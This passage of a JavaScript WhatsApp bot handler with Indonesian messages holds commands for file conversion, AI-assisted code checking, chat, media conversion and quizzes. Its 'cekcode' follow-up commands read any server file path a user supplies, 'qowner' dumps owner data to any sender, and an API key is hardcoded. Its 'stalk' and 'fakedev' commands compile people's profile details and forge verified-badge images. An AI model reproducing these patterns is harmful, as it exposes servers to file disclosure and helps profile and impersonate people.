                if (typeof tofileBufferMap === 'undefined') global.tofileBufferMap = new Map();
                global.tofileBufferMap.set(m.sender, { 
                    buffer: Buffer.from(teksToConvert, "utf-8"), 
                    name: inputName 
                });
    
                const formats = ["txt", "js", "html", "pdf", "json", "py", "php", "md"];
                        
                const sections = [{
                    title: "Pilih Format Dokumen",
                    rows: formats.map(f => ({
                        header: `Format .${f.toUpperCase()}`,
                        title: `Konversi ke ${f}`,
                        description: `Ubah teks menjadi file ${inputName}.${f}`,
                        id: `${prefix}tofileconfirm ${inputName} ${f}`
                    }))
                }];
    
                const listMessage = {
                    title: "📄 FILE CONVERTER",
                    sections
                };
    
                const msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: { text: `Teks berhasil disimpan dengan nama: *${inputName}*\n\nSilakan pilih format file di bawah ini:` },
                                footer: { text: global.footer },
                                header: { hasVideo: false },
                                nativeFlowMessage: {
                                    buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify(listMessage)
                                    }]
                                }
                            }
                        }
                    }
                }, { quoted: contactQ });
    
                await sock.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    
            } catch (e) {
                console.error(e);
                reply("❌ Terjadi kesalahan saat memproses menu.");
            }
        }
        break;
        //═══════════════════════════════════//
        case 'cekcode': {
          try {
            const quoted = m.quoted ? m.quoted : m;
            const doc = (quoted.msg || quoted).document || (quoted.msg || quoted).mimetype ? quoted : null;
        
            if (!quoted || !quoted.document) {
              return reply('⚠️ Reply sebuah dokumen .js, .py, .html, atau .json dengan perintah .cekcode');
            }
        
            const fileName = quoted.document.fileName || quoted.document.file_name;
            const ext = path.extname(fileName).toLowerCase();
            if (!['.js', '.py', '.html', '.json'].includes(ext)) return reply('❌ Format file tidak didukung!');
        
            const fileLink = await sock.uploadMedia ? await sock.uploadMedia(quoted) : await sock.getBinary ? await sock.getBinary(quoted) : null;
        
            let codeText = '';
            try {
              const fileId = quoted.document.fileId || quoted.document.file_id || quoted.document.id;
              const link = await sock.getFile ? await sock.getFile(fileId) : null; 
            } catch (e) {
              // ignore
            }
        
            const filePath = path.join(tempDir, `${Date.now()}_${fileName}`);
            try {
              if (typeof sock.downloadAndSaveMediaMessage === 'function') {
                const mediaPath = await sock.downloadAndSaveMediaMessage(quoted);
                if (mediaPath && fs.existsSync(mediaPath)) {
                  codeText = fs.readFileSync(mediaPath, 'utf8');
                  fs.copyFileSync(mediaPath, filePath);
                }
              }
            } catch (e) {
              // fallback: try to use quoted.download
            }
        
            if (!codeText) {
              try {
                if (quoted.download) {
                  const buffer = await quoted.download();
                  fs.writeFileSync(filePath, buffer);
                  codeText = buffer.toString('utf8');
                }
              } catch (e) {
                // nothing
              }
            }
        
            if (!codeText) {
              await reaction(m.chat, '❌');
              return reply('⚠️ Gagal mengunduh dokumen. Pastikan file dapat di-download oleh bot.');
            }
        
            fs.writeFileSync(filePath, codeText, 'utf8');
        
            const lines = codeText.split('\n').length;
            const variables = (codeText.match(/(let|const|var)\s+/g) || []).length + (codeText.match(/\b[A-Za-z0-9_]+\s*=\s*/g) || []).length * 0;
            const functions = (codeText.match(/function\s+|=>|def\s+/g) || []).length;
        
            // Send loading
            await sock.sendMessage(m.chat, { text: `🧠 Menganalisis kode...\n📄 ${fileName}` }, { quoted: m }).catch(()=>{});
        
            const lintRes = await lintCode(filePath, ext);
        
            let caption = `📊 *HASIL PEMERIKSAAN KODE*\n\n`;
            caption += `📄 *Nama File:* ${fileName}\n`;
            caption += `🧩 *Bahasa:* ${ext === '.js' ? 'JavaScript' : ext === '.py' ? 'Python' : ext === '.html' ? 'HTML' : 'JSON'}\n`;
            caption += `📏 *Baris:* ${lines}\n`;
            caption += `🧠 *Fungsi:* ${functions}\n`;
            caption += `🔡 *Variabel (estimasi):* ${variables}\n\n`;
        
            const rows = [];
            if (lintRes.success) {
              caption += `✅ *Tidak ada error ditemukan.*`;
              rows.push({ title: 'Jelaskan Kode', desc: 'Deskripsikan isi file', id: `.cekcode_explain ${filePath}|${fileName}` });
            } else {
              caption += `❌ *Error Ditemukan*\n`;
              caption += `• Ringkasan: ${lintRes.errorSummary}\n`;
              if (lintRes.errorLines && lintRes.errorLines.length) caption += `• Line terdeteksi: ${lintRes.errorLines.join(', ')}\n`;
              if (lintRes.errorSnippet) caption += `\n\`\`\`\n${lintRes.errorSnippet}\n\`\`\``;
        
              rows.push({ title: 'Perbaiki Kode', desc: 'Coba perbaiki kode (AI)', id: `.cekcode_fix ${filePath}|${fileName}` });
              rows.push({ title: 'Jelaskan Kode', desc: 'Deskripsikan isi file', id: `.cekcode_explain ${filePath}|${fileName}` });
              rows.push({ title: 'Periksa Ulang', desc: 'Lint ulang file ini', id: `.cekcode_recheck ${filePath}|${fileName}` });
            }
        
            const native = {
              buttons: [
                {
                  name: 'single_select',
                  buttonParamsJson: JSON.stringify({ title: 'Pilih Aksi', sections: [{ title: 'Aksi', rows: buildRows(rows) }] }),
                },
              ],
            };
        
            await sock.sendMessage(m.chat, {
              text: caption,
              interactiveMessage: { title: fileName, footer: 'cekcode - AI Helper', nativeFlowMessage: native },
            }, { quoted: m }).catch((e)=>console.error('send interactive', e));
        
            await reaction(m.chat, '✅');
          } catch (err) {
            console.error('cekcode error', err);
            reply('❌ Terjadi kesalahan saat memproses .cekcode');
          }
        }
        break;
        //═══════════════════════════════════//
        case 'cekcode_fix': {
          try {
            if (!q) return reply('Format salah. Gunakan: .cekcode_fix <filePath>|<fileName>');
            const [filePath, fileName] = q.split('|');
            if (!fs.existsSync(filePath)) return reply('❌ File tidak ditemukan di server.');
        
            if (!isOwner(m.sender) && !isPremium(m.sender)) return reply('❌ Fitur ini hanya untuk Owner atau Premium');
        
            await reaction(m.chat, '⏳');
            const code = fs.readFileSync(filePath, 'utf8');
            await sock.sendMessage(m.chat, { text: '🛠️ Memperbaiki kode dengan AI...' }, { quoted: m });
        
            const fixed = await fixCodeAI(code, path.extname(fileName), 0, 10);
        
            const fixedFile = `fixed_${path.basename(fileName)}`;
            const fixedPath = path.join(tempDir, fixedFile);
            fs.writeFileSync(fixedPath, fixed.code, 'utf8');
        
            let caption = fixed.clean ? '✅ Kode telah diperbaiki dan tidak ditemukan error lagi.' : `⚠️ Kode diperbaiki, namun masih ada error:\n${fixed.error || '-'}`;
        
            const rows = [
              { title: 'Recheck', desc: 'Periksa ulang file hasil perbaikan', id: `.cekcode_recheck ${fixedPath}|${fixedFile}` },
              { title: 'Optimasi', desc: 'Minta AI optimasi kode', id: `.cekcode_optimize ${fixedPath}|${fixedFile}` },
            ];
            if (!fixed.clean) rows.push({ title: 'Perbaiki Ulang', desc: 'Coba perbaiki lagi', id: `.cekcode_fix ${fixedPath}|${fixedFile}` });
        
            // send fixed file as document
            await sock.sendMessage(m.chat, {
              document: fs.readFileSync(fixedPath),
              fileName: fixedFile,
              caption,
              interactiveMessage: { title: fixedFile, footer: 'Hasil Fix', nativeFlowMessage: { buttons: [ { name: 'single_select', buttonParamsJson: JSON.stringify({ title: 'Pilih Aksi', sections: [{ title: 'Aksi', rows: buildRows(rows) }] }) } ] } }
            }, { quoted: m });
        
            await reaction(m.chat, '✅');
          } catch (err) {
            console.error('cekcode_fix error', err);
            reply('❌ Gagal memperbaiki kode.');
          }
        }
        break;
        //═══════════════════════════════════//
        case 'cekcode_explain': {
          try {
            if (!q) return reply('Format salah. Gunakan: .cekcode_explain <filePath>|<fileName>');
            const [filePath, fileName] = q.split('|');
            if (!fs.existsSync(filePath)) return reply('❌ File tidak ditemukan.');
        
            if (!isOwner(m.sender) && !isPremium(m.sender)) return reply('❌ Fitur ini hanya untuk Owner atau Premium');
        
            await reaction(m.chat, '⏳');
            const code = fs.readFileSync(filePath, 'utf8');
            const explanation = await explainCodeAI(code, path.extname(fileName), 'default');
        
            if (explanation.length > 4000) {
              const tmp = saveTempFile(`${fileName}-explain.txt`, explanation);
              await sock.sendMessage(m.chat, { document: fs.readFileSync(tmp), fileName: path.basename(tmp), caption: '📄 Hasil Penjelasan (file)'} , { quoted: m });
            } else {
              await sock.sendMessage(m.chat, { text: `🧠 Penjelasan Kode:\n\n${explanation}` }, { quoted: m });
            }
        
            await reaction(m.chat, '✅');
          } catch (err) {
            console.error('cekcode_explain error', err);
            reply('❌ Gagal menjelaskan kode.');
          }
        }
        break;
        //═══════════════════════════════════//
        case 'cekcode_recheck': {
          try {
            if (!q) return reply('Format salah. Gunakan: .cekcode_recheck <filePath>|<fileName>');
            const [filePath, fileName] = q.split('|');
            if (!fs.existsSync(filePath)) return reply('❌ File tidak ditemukan.');
        
            if (!isOwner(m.sender) && !isPremium(m.sender)) return reply('❌ Fitur ini hanya untuk Owner atau Premium');
        
            await reaction(m.chat, '⏳');
            const result = await lintCode(filePath, path.extname(fileName));
        
            let caption = `🔁 *HASIL PEMERIKSAAN ULANG*\n\n📄 *${fileName}*\n\n`;
            if (result.success) caption += '✅ Tidak ditemukan error baru.';
            else caption += `❌ Masih ada error:\n• ${result.errorSummary}\n\n\`\`\`\n${result.errorSnippet}\n\`\`\``;
        
            await sock.sendMessage(m.chat, { text: caption }, { quoted: m });
            await reaction(m.chat, '✅');
          } catch (err) {
            console.error('cekcode_recheck error', err);
            reply('❌ Gagal recheck file.');
          }
        }
        break;
        //═══════════════════════════════════//
        case 'cekcode_optimize': {
          try {
            if (!q) return reply('Format salah. Gunakan: .cekcode_optimize <filePath>|<fileName>');
            const [filePath, fileName] = q.split('|');
            if (!fs.existsSync(filePath)) return reply('❌ File tidak ditemukan.');
        
            if (!isOwner(m.sender) && !isPremium(m.sender)) return reply('❌ Fitur ini hanya untuk Owner atau Premium');
        
            await reaction(m.chat, '⏳');
            const code = fs.readFileSync(filePath, 'utf8');
            const optimized = await explainCodeAI(code, path.extname(fileName), 'optimize');
        
            if (optimized.length > 4000) {
              const tmp = saveTempFile(`${fileName}-optimize.txt`, optimized);
              await sock.sendMessage(m.chat, { document: fs.readFileSync(tmp), fileName: path.basename(tmp), caption: '📄 Hasil Optimasi (file)'} , { quoted: m });
            } else {
              await sock.sendMessage(m.chat, { text: `⚙️ Hasil Optimasi:\n\n${optimized}` }, { quoted: m });
            }
        
            await reaction(m.chat, '✅');
          } catch (err) {
            console.error('cekcode_optimize error', err);
            reply('❌ Gagal optimasi kode.');
          }
        }
        break;
        //═══════════════════════════════════//
        case 'autoaigc':
        case 'autoai': {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return m.reply(`Contoh: ${prefix + command} on/off`)
            if (args[0] === 'on') {
            global.autoaigc = true
            await m.reply(`Sukses mengaktifkan ${command}.`)
            } else if (args[0] === 'off') {
            global.autoaigc = false
            await m.reply(`Sukses menonaktifkan ${command}.`)
            }
        }
        break
        //═══════════════════════════════════//
        case 'qreset':
          if (db.users[m.sender]) db.users[m.sender].memory = []
          saveDB(db)
          m.reply('Memory bot direset.')
        break
        //═══════════════════════════════════//
        case 'qwake':
          if (!m.isGroup) return
          if (db.groups[m.chat]) db.groups[m.chat].sleepUntil = 0
          saveDB(db)
          m.reply('Bot aktif kembali.')
        break
        //═══════════════════════════════════//
        case 'qgreet':
          if (!isOwnerNumber(m.sender)) return
          db.owner.lastGreet = 0
          saveDB(db)
          m.reply('Bot siap.')
        break
        //═══════════════════════════════════//
        case 'qowner':
          m.reply(JSON.stringify(db.owner, null, 2))
        break
        //═══════════════════════════════════//
        case 'gemini':
        case 'luminai':
        case 'gpt':
        case 'openai': {
              try {
                if (!text) return m.reply(`Contoh: ${command} hai`);
                await sock.sendMessage(m.chat, {react: {text: '💬', key: m.key}})
                let prompt = `Your name is ${namaBot} and use Indonesian as your primary language.`
                const apiUrl = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${prompt}&content=${text}`)
                const gpt = apiUrl.data
                m.reply(`${gpt}`)
              } catch (err) {
                console.error(err)
                m.reply('Terjadi kesalahan')
              }
            }
        break
        //═══════════════════════════════════//
        case 'wastalk': case 'whatsappstalk': case 'stalkwa': {
    				if (!text) return m.reply(`Example: ${prefix + command} @tag / 628xxx`)
    				try {
    					let num = m.quoted?.sender || m.mentionedJid?.[0] || text
    					if (!num) return m.reply(`Example : ${prefix + command} @tag / 628xxx`)
    					num = num.replace(/\D/g, '') + '@s.whatsapp.net'
    					if (!(await sock.onWhatsApp(num))[0]?.exists) return m.reply('Nomer tidak terdaftar di WhatsApp!')
    					let img = await sock.profilePictureUrl(num, 'image').catch(_ => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60')
    					let bio = await sock.fetchStatus(num).catch(_ => { })
    					let name = await sock.getName(num)
    					let business = await sock.getBusinessProfile(num)
    					let format = PhoneNum(`+${num.split('@')[0]}`)
    					let regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
    					let country = regionNames.of(format.getRegionCode('international'));
    					let wea = `WhatsApp Stalk\n\n*° Country :* ${country.toUpperCase()}\n*° Name :* ${name ? name : '-'}\n*° Format Number :* ${format.getNumber('international')}\n*° Url Api :* wa.me/${num.split('@')[0]}\n*° Mentions :* @${num.split('@')[0]}\n*° Status :* ${bio?.status || '-'}\n*° Date Status :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `*WhatsApp Business Stalk*\n\n*° BusinessId :* ${business.wid}\n*° Website :* ${business.website ? business.website : '-'}\n*° Email :* ${business.email ? business.email : '-'}\n*° Category :* ${business.category}\n*° Address :* ${business.address ? business.address : '-'}\n*° Timeone :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*° Description* : ${business.description ? business.description : '-'}` : '*Standard WhatsApp Account*'}`
    					img ? await sock.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m }) : m.reply(wea)
    				} catch (e) {
    					m.reply('Nomer Tidak ditemukan!')
    				}
    			}
    			break
    			//═══════════════════════════════════//
    			case 'telestalk': case 'telegramstalk': case 'stalktg': {
               if (!args[0]) return reply(`❌ ☇ Format: ${command} username`)
                   
               let username = args[0].replace('@', '')
               let url = `https://qwerty-api.cloud/st/tg?username=${username}`
    
               try {
                   let res = await fetch(url)
                   let json = await res.json()
    
                   if (!json.status) return reply('User tidak ditemukan!')
    
                   let r = json.result
                      
                   let captionnya = `
    ╭──〔 *TELEGRAM STALK* 〕
    │ *Nama      :* ${r.full_name || '-'}
    │ *Username  :* @${r.username}
    │ *Bio       :* ${r.bio || '-'}
    │ *Link      :* https://t.me/${r.username}
    ╰───────────────`
    
                    await sock.sendMessage(m.chat, {
                         image: { url: r.image },
                         caption: captionnya
                    }, { quoted: m })
    
                } catch (err) {
                    console.log(err)
                    reply('Error mengambil data!')
            }
        }
        break;
    		//═══════════════════════════════════//
    		case 'tiktokstalk': case 'ttstalk': {
    				if (!text) return m.reply(`Example: ${prefix + command} usernamenya`)
    				try {
    					const res = await tiktokStalk(text)
    					reply({ image: { url: res.avatarThumb }, caption: `*Username :* ${text}\n*Nickname :* ${res.nickname}\n*Followers :* ${res.followerCount}\n*Following :* ${res.followingCount}\n*Bio :* ${res.signature}\n*Verified :* ${res.verified}\n*Video Count :* ${res.videoCount}\n*Heart Count :* ${res.heartCount}` })
    				} catch (e) {
    					m.reply('Username Tidak ditemukan!')
    				}
    		}
    	  break
        //═══════════════════════════════════//
        case 'texttospech': case 'tts': case 'tospech': {
  				if (!text) return m.reply('Mana text yg mau diubah menjadi audio?')
  				let { tts } = require('../engine/tts')
  				let anu = await tts(text)
  				m.reply({ audio: anu, ptt: true, mimetype: 'audio/mpeg' })
  			}
  			break
  			//═══════════════════════════════════//
        case 'cuaca': case 'weather': {
    				if (!text) return reply(`Example: ${prefix + command} jakarta`)
    				try {
    					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
    					reply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
    				} catch (e) {
    					m.reply('Kota Tidak Di Temukan!')
    				}
    	  }
    		break
    		//═══════════════════════════════════//
        case 'toaud': case "tomp3": case "toaudio": {
            let quoted = m.quoted ? m.quoted : m
            if (!quoted.mimetype?.includes("video"))
                return reply("Reply / kirim video dengan caption .toaudio")
        
            await sock.sendMessage(m.chat, { react: { text: "🎧", key: m.key } })
        
            let media = await quoted.download()
        
            await sock.sendMessage(m.chat, {
                audio: media,
                mimetype: "audio/mpeg",
                contextInfo: {
                    mentionedJid:[m.sender],
                    isForwarded: true, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran, 
                        serverId: 200
                    }, 
                    externalAdReply: {
                        title: `© ${global.botname}`,
                        body: `Script Version: ${global.global.version}`,
                        thumbnailUrl: global.thumb, 
                        renderLargerThumbnail: false, 
                        mediaType: 1, 
                        previewType: 1, 
                        sourceUrl: global.linkSaluran, 
                    }
                }
            }, { quoted: m })
        }
        break
        //═══════════════════════════════════//
        case "tovn": {
            let quoted = m.quoted ? m.quoted : m
            if (!quoted.mimetype?.includes("audio"))
                return reply("Reply / kirim audio dengan caption .tovn")
        
            await sock.sendMessage(m.chat, { react: { text: "🎙️", key: m.key } })
        
            let media = await quoted.download()
        
            await sock.sendMessage(m.chat, {
                audio: media,
                mimetype: "audio/ogg; codecs=opus",
                ptt: true,
                contextInfo: {
                    mentionedJid:[m.sender],
                    isForwarded: true, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran, 
                        serverId: 200
                    }, 
                    externalAdReply: {
                        title: `© ${global.botname}`,
                        body: `Script Version: ${global.global.version}`,
                        thumbnailUrl: global.thumb, 
                        renderLargerThumbnail: false, 
                        mediaType: 1, 
                        previewType: 1, 
                        sourceUrl: global.linkSaluran, 
                    }
                }
            }, { quoted: m })
        }
        break
        //═══════════════════════════════════//
        case "togif": {
            let quoted = m.quoted ? m.quoted : m
            if (!quoted.mimetype?.includes("video"))
                return reply("Reply / kirim video dengan caption .togif")
        
            await sock.sendMessage(m.chat, { react: { text: "🎞️", key: m.key } })
        
            let media = await quoted.download()
        
            await sock.sendMessage(m.chat, {
                video: media,
                gifPlayback: true,
                contextInfo: {
                    mentionedJid:[m.sender],
                    isForwarded: true, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran, 
                        serverId: 200
                    }, 
                    externalAdReply: {
                        title: `© ${global.botname}`,
                        body: `Script Version: ${global.global.version}`,
                        thumbnailUrl: global.thumb, 
                        renderLargerThumbnail: false, 
                        mediaType: 1, 
                        previewType: 1, 
                        sourceUrl: global.linkSaluran, 
                    }
                }
            }, { quoted: m })
        }
        break
        //═══════════════════════════════════//
        case "toptv": {
            let quoted = m.quoted ? m.quoted : m
            if (!quoted.mimetype?.includes("video"))
                return reply("Reply / kirim video dengan caption .toptv")
        
            await sock.sendMessage(m.chat, { react: { text: "📹", key: m.key } })
        
            let media = await quoted.download()
        
            await sock.sendMessage(m.chat, {
                video: media,
                ptv: true,
                contextInfo: {
                    mentionedJid:[m.sender],
                    isForwarded: true, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran, 
                        serverId: 200
                    }, 
                    externalAdReply: {
                        title: `© ${global.botname}`,
                        body: `Script Version: ${global.global.version}`,
                        thumbnailUrl: global.thumb, 
                        renderLargerThumbnail: false, 
                        mediaType: 1, 
                        previewType: 1, 
                        sourceUrl: global.linkSaluran, 
                    }
                }
            }, { quoted: m })
        }
        break
        //═══════════════════════════════════//
        case 'quizpoll': case 'quiz':
        case 'quizv3':
        case 'wiquiz': {
            if(!isDeveloper) return; 
            // Command format: .quiz "Pertanyaan" | A | B | C | jawaban
            if (!text) {
                return reply(
                    '📝 *FORMAT QUIZ*\n\n' +
                    `\`\`\`${prefix}quiz "Pertanyaan" | A | B | C | B\`\`\`\n\n` +
                    '📌 *Contoh:*\n' +
                    `\`\`\`${prefix}quiz "Apa ibukota Indonesia?" | Jakarta | Bandung | Surabaya | A\`\`\``
                );
            }
            
            // Parse input
            const match = text.match(/"(.*?)" \| (.*?) \| (.*?) \| (.*?) \| (.*)/);
            if (!match) {
                return reply('❌ Format salah! Gunakan format di atas.');
            }
            
            const [, question, optA, optB, optC, answer] = match;
            
            // Validasi jawaban
            const validAnswers = ['A', 'B', 'C'];
            const upperAnswer = answer.trim().toUpperCase();
            
            if (!validAnswers.includes(upperAnswer)) {
                return reply('❌ Jawaban harus A, B, atau C!');
            }
            
            // Generate options array
            const options = [
                { optionName: `A) ${optA.trim()}` },
                { optionName: `B) ${optB.trim()}` },
                { optionName: `C) ${optC.trim()}` }
            ];
            
            // Determine correct option index
            const correctIndex = upperAnswer === 'A' ? 0 : upperAnswer === 'B' ? 1 : 2;
            const correctAnswer = options[correctIndex];
            
            try {
                // Send reaction
                await sock.sendMessage(m.chat, { 
                    react: { text: '🎯', key: m.key } 
                });
                
                // Send processing message
                const processingMsg = await sock.sendMessage(m.chat, {
                    text: '⚙️ *Membuat Quiz Polling...*'
                }, { quoted: m });
                
                // Generate quiz message
                const msg = generateWAMessageFromContent(m.chat, {
                    botInvokeMessage: {
                        message: {
                            messageContextInfo: {
                                messageSecret: crypto.randomBytes(32), 
                                messageAssociation: {
                                    associationType: 7,
                                    parentMessageKey: crypto.randomBytes(16)
                                }
                            }, 
                            pollCreationMessageV3: {
                                name: `🎯 QUIZ: ${question}`, 
                                options: options,
                                selectableOptionsCount: 1,
                                pollContentType: 1,
                                pollType: "QUIZ",
                                correctAnswer: correctAnswer
                            }
                        }
                    }
                }, {});
                
                // Send the quiz
                await sock.relayMessage(m.chat, msg.message, {
                    messageId: msg.key.id
                });
                
                // Update processing message
                await sock.sendMessage(m.chat, {
                    edit: processingMsg.key,
                    text: `✅ *Quiz Berhasil Dibuat!*\n\n` +
                          `❓ *Pertanyaan:* ${question}\n` +
                          `🎯 *Jawaban benar:* ${upperAnswer}\n\n` +
                          `⚠️ *Catatan:* User hanya bisa pilih 1x!`
                });
                
                // Store quiz data for tracking
                const quizId = msg.key.id;
                if (!global.quizzes) global.quizzes = {};
                
                global.quizzes[quizId] = {
                    question,
                    options: { A: optA, B: optB, C: optC },
                    correctAnswer: upperAnswer,
                    correctOption: correctAnswer,
                    groupId: m.chat,
                    creator: m.sender,
                    createdAt: Date.now(),
                    voters: new Set()
                };
                
                // Auto cleanup after 1 hour
                setTimeout(() => {
                    if (global.quizzes && global.quizzes[quizId]) {
                        delete global.quizzes[quizId];
                    }
                }, 3600000);
                
            } catch (error) {
                console.error('Quiz V3 Error:', error);
                reply(`❌ Gagal membuat quiz:\n${error.message}`);
            }
        }
        break;
        // ================================================
        // QUIZ MANAGEMENT COMMANDS
        // ================================================
        case 'quizlist': {
            if (!global.quizzes || Object.keys(global.quizzes).length === 0) {
                return reply('📭 Tidak ada quiz aktif saat ini.');
            }
            
            let list = '📋 *DAFTAR QUIZ AKTIF*\n\n';
            let index = 1;
            
            for (const [id, quiz] of Object.entries(global.quizzes)) {
                const timeAgo = Math.floor((Date.now() - quiz.createdAt) / 60000);
                list += `${index}. *ID:* ${id.slice(-6)}\n`;
                list += `   ❓ ${quiz.question}\n`;
                list += `   ✅ Jawaban: ${quiz.correctAnswer}\n`;
                list += `   👤 Voters: ${quiz.voters.size}\n`;
                list += `   ⏰ ${timeAgo} menit lalu\n\n`;
                index++;
            }
            
            reply(list);
        }
        break;
        //═══════════════════════════════════//
        case 'quizstats': {
            if (!text) return reply('Format: .quizstats <quiz_id>\n.quizlist untuk lihat ID');
            
            const quizId = text.trim();
            if (!global.quizzes || !global.quizzes[quizId]) {
                return reply(`❌ Quiz dengan ID "${quizId}" tidak ditemukan.`);
            }
            
            const quiz = global.quizzes[quizId];
            const age = Math.floor((Date.now() - quiz.createdAt) / 60000);
            
            const stats = `📊 *STATISTIK QUIZ*\n\n` +
                          `🎯 *ID:* ${quizId.slice(-6)}\n` +
                          `❓ *Pertanyaan:* ${quiz.question}\n` +
                          `✅ *Jawaban benar:* ${quiz.correctAnswer}\n\n` +
                          `📈 *Statistik:*\n` +
                          `• 👥 Total voters: ${quiz.voters.size}\n` +
                          `• ⏰ Dibuat: ${age} menit lalu\n` +
                          `• 👤 Pembuat: ${quiz.creator.split('@')[0]}\n\n` +
                          `📝 *Opsi:*\n` +
                          `A) ${quiz.options.A}\n` +
                          `B) ${quiz.options.B}\n` +
                          `C) ${quiz.options.C}`;
            
            reply(stats);
        }
        break;
        //═══════════════════════════════════//
        case 'quizend': {
            if (!text) return reply('Format: .quizend <quiz_id>');
            
            const quizId = text.trim();
            if (!global.quizzes || !global.quizzes[quizId]) {
                return reply(`❌ Quiz dengan ID "${quizId}" tidak ditemukan.`);
            }
            
            const quiz = global.quizzes[quizId];
            
            // Cek apakah user adalah pembuat quiz
            if (quiz.creator !== m.sender) {
                return reply('❌ Hanya pembuat quiz yang bisa mengakhirinya!');
            }
            
            const results = `🏁 *QUIZ BERAKHIR!*\n\n` +
                            `❓ *Pertanyaan:* ${quiz.question}\n\n` +
                            `📊 *Hasil:*\n` +
                            `A) ${quiz.options.A} ${quiz.correctAnswer === 'A' ? '✅' : '❌'}\n` +
                            `B) ${quiz.options.B} ${quiz.correctAnswer === 'B' ? '✅' : '❌'}\n` +
                            `C) ${quiz.options.C} ${quiz.correctAnswer === 'C' ? '✅' : '❌'}\n\n` +
                            `🎯 *Jawaban benar:* ${quiz.correctAnswer}\n` +
                            `👥 *Total peserta:* ${quiz.voters.size}`;
            
            reply(results);
            
            // Hapus dari storage
            delete global.quizzes[quizId];
        }
        break;
        //═══════════════════════════════════//
        // ================================================
        // RANDOM QUIZ GENERATOR
        // ================================================
        case 'randomquiz': {
            const categories = {
                matematika: [
                    ["Berapa hasil 15 × 3?", "30", "45", "50", "B"],
                    ["√144 = ?", "10", "12", "14", "B"],
                    ["2³ = ?", "4", "6", "8", "C"]
                ],
                pengetahuan: [
                    ["Ibukota Jepang?", "Osaka", "Tokyo", "Kyoto", "B"],
                    ["Planet terbesar?", "Bumi", "Jupiter", "Saturnus", "B"],
                    ["Penemu gravitasi?", "Einstein", "Newton", "Tesla", "B"]
                ],
                trivia: [
                    ["Warna bendera Indonesia?", "Merah Putih", "Merah Hijau", "Putih Biru", "A"],
                    ["Hewan nasional Indonesia?", "Harimau", "Elang", "Komodo", "C"],
                    ["Tahun Indonesia merdeka?", "1944", "1945", "1946", "B"]
                ]
            };
            
            // Pilih kategori random
            const categoryKeys = Object.keys(categories);
            const randomCategory = categoryKeys[Math.floor(Math.random() * categoryKeys.length)];
            const questions = categories[randomCategory];
            const randomQuestion = questions[Math.floor(Math.random() * questions.length)];
            
            const [question, optA, optB, optC, answer] = randomQuestion;
            
            // Kirim command quiz otomatis
            const fakeText = `"${question}" | ${optA} | ${optB} | ${optC} | ${answer}`;
            
            // Simulasikan input
            m.text = fakeText;
            text = fakeText;
            
            // Panggil command quiz
            await sock.ev.emit('messages.upsert', {
                messages: [m],
                type: 'append'
            });
        }
        break;
        //═══════════════════════════════════//
        case 'fakedev': {
            if (!text || !text.includes('|')) {
              return reply(`${noticenya}\n${prefix}fakedev Nama Kamu | true | 2\n\nKeterangan:\n- "true" = verified badge\n- "false" = tanpa badge\n- Angka terakhir = background (1, 2, atau 3)`)
            }
          
            const parts = text.split('|').map(v => v.trim())
            const nama = parts[0]
            const verified = (parts[1] || 'false').toLowerCase()
            const bgIndex = parseInt(parts[2]) || 1
          
            await sock.sendMessage(m.chat, { react: { text: '♠️', key: m.key } })
          
            try {
                let media
                if (m.quoted && /image/.test(m.quoted.mimetype)) {
                  media = await m.quoted.download()
                } else if (/image/.test(m.mimetype)) {
                  media = await m.download()
                } else {
                  return reply('Reply gambarnya untuk digunakan.')
                }
            
                // Pilihan background
                const backgrounds = {
                  1: 'https://files.catbox.moe/ek8di9.jpg',
                  2: 'https://files.catbox.moe/jmfbzl.jpg',
                  3: 'https://files.catbox.moe/j78ips.jpg',
                  4: `${global.fakedev}`
                }
            
                // Tentukan background
                const bgUrl = backgrounds[bgIndex] || backgrounds[1]
                const userImage = await loadImage(media)
                const bg = await loadImage(bgUrl)
                const badge = await loadImage('https://files.catbox.moe/6hkvux.png')
            
                // Canvas dasar
                const canvas = createCanvas(1080, 1080)
                const ctx = canvas.getContext('2d')
            
                // Gambar latar
                ctx.drawImage(bg, 0, 0, canvas.width, canvas.height)
            
                // Gambar foto profil bulat
                const centerX = canvas.width / 2
                const centerY = canvas.height / 2
                const radius = 263
            
                ctx.save()
                ctx.beginPath()
                ctx.arc(centerX, centerY, radius, 0, Math.PI * 2)
                ctx.closePath()
                ctx.clip()
                ctx.drawImage(userImage, centerX - radius, centerY - radius, radius * 2, radius * 2)
                ctx.restore()
            
                // Gambar teks melingkar + badge
                ctx.font = 'bold 60px Arial'
                ctx.fillStyle = '#fff'
                ctx.textAlign = 'center'
                ctx.textBaseline = 'middle'
                drawCircularTextTop(ctx, nama.toUpperCase(), centerX, centerY, radius, verified === 'true' ? badge : null)
            
                // Kirim hasil
                const buffer = canvas.toBuffer()
                await sock.sendMessage(m.chat, {
